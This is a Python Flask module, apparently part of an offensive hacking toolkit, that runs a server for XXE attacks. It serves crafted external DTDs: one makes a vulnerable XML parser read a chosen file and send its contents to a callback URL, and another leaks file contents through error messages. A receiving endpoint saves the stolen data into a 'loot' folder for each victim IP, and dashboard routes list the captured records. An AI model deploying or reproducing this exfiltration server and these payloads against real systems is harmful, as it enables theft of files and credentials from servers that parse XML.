from meuk.hacksec import *  # noqa: F403
from flask import Blueprint, render_template, abort, request, Response, jsonify
from meuk.flask.models import *  # noqa: F403
from meuk.flask.security import require_dashboard_access
from app import db
import hashlib
import calendar
import datetime

xxe_bp = Blueprint('xxe_bp', __name__,
                    template_folder='html',
                    static_folder='static')


# ---------- payload routes (geen auth) ----------

@xxe_bp.route("/xxe/yolo.dtd", methods=["GET"])
def oob():
    if not request.args.get('request'):
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")

    callback = request.args.get('callback', '')
    bestand = request.args.get('request')

    xml = (
        '<!ENTITY % ext SYSTEM "' + bestand + '">'
        '<!ENTITY % eval "<!ENTITY &#x25; yolo SYSTEM \''
        + callback + '/xxe/froufrou?naam='
        + bestand.replace('.', '').replace('/', '_')
        + '&hatseflats=%ext;\'>">'
        '%eval;%yolo;'
    )

    ip = request.remote_addr
    md5 = hashlib.md5((ip + bestand).encode()).hexdigest()
    hebben = db_xxe.query.filter_by(ip=ip, md5=md5).first()
    if hebben is None:
        record = db_xxe(ip=ip, bestand=bestand, methode='oob', md5=md5)
        db.session.add(record)
        db.session.commit()

    return Response(xml, mimetype='text/xml')


@xxe_bp.route("/xxe/froufrou", methods=["GET"])
def froufrou():
    ip = request.remote_addr
    data = request.args.get('hatseflats', '')

    if not request.args.get('request') and not data:
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")

    if not os.path.exists(os.path.join('raw', 'loot', ip, 'xxe')):
        os.makedirs(f"raw/loot/{ip}/xxe")

    if request.args.get('naam'):
        naam = request.args.get('naam').replace('.', '').replace('/', '_')
        schrijven(f"raw/loot/{ip}/xxe/{naam}.txt", data)
    else:
        date = datetime.datetime.utcnow()
        tijdstip = calendar.timegm(date.utctimetuple())
        schrijven(f"raw/loot/{ip}/xxe/{tijdstip}_xxe.txt", data)

    md5 = hashlib.md5((ip + data[:1000]).encode()).hexdigest()
    hebben = db_xxe.query.filter_by(ip=ip, md5=md5).first()
    if hebben is None:
        record = db_xxe(
            ip=ip, bestand=request.args.get('naam', 'callback'),
            data=data[:10000], methode='callback', md5=md5,
        )
        db.session.add(record)
        db.session.commit()

    return '[!] Tot ziens en bedankt voor de vis.'


@xxe_bp.route("/xxe/fout.dtd", methods=["GET"])
def error():
    if not request.args.get('resource'):
        abort(404, description="[*] Incompetent Bastard v0.42\n[!] You failed!")

    bestand = request.args.get('resource')
    xml = (
        '<!ENTITY % ext SYSTEM "' + bestand + '">'
        '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM '
        '\'file:///nonexistent/%ext;\'>">'
        '%eval;%error;'
    )

    ip = request.remote_addr
    md5 = hashlib.md5((ip + bestand + 'error').encode()).hexdigest()
    hebben = db_xxe.query.filter_by(ip=ip, md5=md5).first()
    if hebben is None:
        record = db_xxe(ip=ip, bestand=bestand, methode='error', md5=md5)
        db.session.add(record)
        db.session.commit()

    return Response(xml, mimetype='text/xml')


# ---------- dashboard routes (auth) ----------

@xxe_bp.route("/dashboard/xxe", methods=["GET"])
def xxe_dashboard():
    require_dashboard_access()
    records = db_xxe.query.order_by(db_xxe.id.desc()).all()

    appdata = db_instellingen.query.first()
    host = appdata.localhost if appdata else 'http://127.0.0.1:5000'

    return render_template('xxe_dashboard.html', records=records, host=host)


@xxe_bp.route("/api/xxe/data", methods=["GET"])
def api_xxe_data():
    require_dashboard_access()
    records = db_xxe.query.order_by(db_xxe.id.desc()).all()
    return jsonify([{
        'id': r.id,
        'datum': r.datum.isoformat() if r.datum else None,
        'ip': r.ip,
        'bestand': r.bestand,
        'data': r.data[:2000] if r.data else '',
        'methode': r.methode,
    } for r in records])


@xxe_bp.route("/api/xxe/<int:record_id>", methods=["DELETE"])
def api_xxe_delete(record_id):
    require_dashboard_access()
    record = db.session.get(db_xxe, record_id)
    if not record:
        return jsonify({'error': 'not found'}), 404
    db.session.delete(record)
    db.session.commit()
    return '', 204
